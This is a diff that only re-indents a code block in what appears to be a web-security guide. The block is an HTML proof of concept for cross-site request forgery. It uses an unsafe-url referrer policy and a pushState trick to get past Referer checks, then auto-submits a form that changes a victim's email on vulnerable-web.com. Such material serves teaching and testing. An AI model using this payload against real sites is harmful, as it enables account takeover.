@@ -159,18 +159,19 @@ Referer: https://atacante-web.com/?vulnerable-web.com
 
 ```html
 <html>
-<head>
-<meta name="referrer" content="unsafe-url" />
-</head>
-  <body> 
-  <script>
-history.pushState("", "", "/?vulnerable-web.com")
-    </script>
-    <form action="https://vulnerable-web.com/email/change" method="POST">
-      <input type="hidden" name="email" value="pwned@gmail.com" />
-      <input type="submit" value="Submit request" />
-    </form>
-<script>document.forms[0].submit();</script>
-  </body>
+   <head>
+      <meta name="referrer" content="unsafe-url" />
+   </head>
+   <body>
+      <script>
+         history.pushState("", "", "/?vulnerable-web.com")
+             
+      </script>
+      <form action="https://vulnerable-web.com/email/change" method="POST">
+         <input type="hidden" name="email" value="pwned@gmail.com" />
+         <input type="submit" value="Submit request" />
+      </form>
+      <script>document.forms[0].submit();</script>
+   </body>
 </html>
 ```
